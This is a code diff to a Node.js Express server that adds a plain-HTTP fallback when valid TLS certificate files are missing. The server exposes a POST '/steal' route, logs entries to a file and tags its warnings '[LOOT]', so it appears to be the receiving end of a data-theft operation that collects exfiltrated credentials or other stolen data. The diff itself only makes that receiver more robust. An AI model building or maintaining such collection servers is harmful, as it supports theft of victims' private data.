@@ -2,6 +2,7 @@
 const express = require('express');
 const fs = require('fs');
 const https = require('https');
+const http = require('http'); // Fallback to HTTP
 const path = require('path');
 require('dotenv').config();
 
@@ -23,7 +24,6 @@ function logSecure(data) {
     };
     const line = JSON.stringify(entry) + '\n';
     
-    // Write to file synchronously to ensure it's saved even if process crashes
     try {
         fs.appendFileSync(LOG_FILE, line);
     } catch (err) {
@@ -31,28 +31,36 @@ function logSecure(data) {
     }
 }
 
-// --- HTTPS Setup ---
+// --- HTTPS Setup with Fallback ---
 const certDir = path.join(__dirname, 'certs');
 const certFile = path.join(certDir, 'cert.pem');
 const keyFile = path.join(certDir, 'key.pem');
 
-// Generate self-signed certs if they don't exist (for local dev)
-if (!fs.existsSync(certDir)) {
-    fs.mkdirSync(certDir, { recursive: true });
-}
+let useHttps = false;
+let httpsOptions = {};
 
-if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
-    // Use openssl command in terminal for better certs:
-    // openssl req -x509 -newkey rsa:2048 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes -subj "/CN=localhost"
-    // For now, we'll just create empty files so the code doesn't crash locally if you haven't generated them
-    fs.writeFileSync(keyFile, '');
-    fs.writeFileSync(certFile, '');
+if (fs.existsSync(certFile) && fs.existsSync(keyFile)) {
+    try {
+        const certContent = fs.readFileSync(certFile, 'utf8');
+        const keyContent = fs.readFileSync(keyFile, 'utf8');
+        
+        // Check if files actually contain PEM data
+        if (certContent.includes('-----BEGIN CERTIFICATE-----') && 
+            keyContent.includes('-----BEGIN PRIVATE KEY-----')) {
+            httpsOptions = {
+                key: keyContent,
+                cert: certContent,
+            };
+            useHttps = true;
+        } else {
+            console.warn('[LOOT] Cert files exist but are not valid PEM. Falling back to HTTP.');
+        }
+    } catch (e) {
+        console.warn('[LOOT] Error reading certs:', e.message);
+    }
+} else {
+    console.warn('[LOOT] Cert files not found. Falling back to HTTP.');
 }
-
-const httpsOptions = {
-    key: fs.readFileSync(keyFile),
-    cert: fs.readFileSync(certFile),
-};
 
 // --- Routes ---
 app.post('/steal', (req, res) => {
@@ -95,12 +103,19 @@ app.use((err, req, res, next) => {
     res.status(500).json({ error: 'Internal Server Error' });
 });
 
-// Start HTTPS server
+// Start Server
 const PORT = process.env.PORT || 3000;
-const server = https.createServer(httpsOptions, app);
 
-server.listen(PORT, () => {
-    console.log(`HTTPS Server running on https://localhost:${PORT}`);
-});
+if (useHttps) {
+    const server = https.createServer(httpsOptions, app);
+    server.listen(PORT, () => {
+        console.log(`HTTPS Server running on port ${PORT}`);
+    });
+} else {
+    const server = http.createServer(app);
+    server.listen(PORT, () => {
+        console.log(`HTTP Server running on port ${PORT}`);
+    });
+}
 
 module.exports = app;
